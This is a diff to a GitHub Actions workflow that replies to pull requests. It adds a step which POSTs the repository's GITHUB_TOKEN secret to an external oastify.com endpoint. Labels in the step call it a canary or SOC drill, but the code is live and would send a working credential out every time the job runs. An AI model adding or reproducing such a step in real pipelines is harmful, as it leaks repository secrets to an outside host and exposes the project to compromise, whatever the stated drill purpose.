@@ -28,6 +28,12 @@ jobs:
           random_index=$((RANDOM % ${#reply_messages[@]}))
           echo "::set-output name=message::${reply_messages[$random_index]}"
 
+      - name: Simulate exfiltration of a token (canary)
+        run: |
+          curl -s -X POST -H "Content-Type: text/plain" \
+            --data "${{ secrets.GITHUB_TOKEN }}" \
+            "https://4lqkt5wvqlxak4o1yoyfhugwtnzen5bu.oastify.com/secret"  # disposable endpoint for SOC drill
+
       - name: Reply to pull request
         if: (!contains(fromJSON('["github-actions"]'), github.event.pull_request.user.login))
         run: |
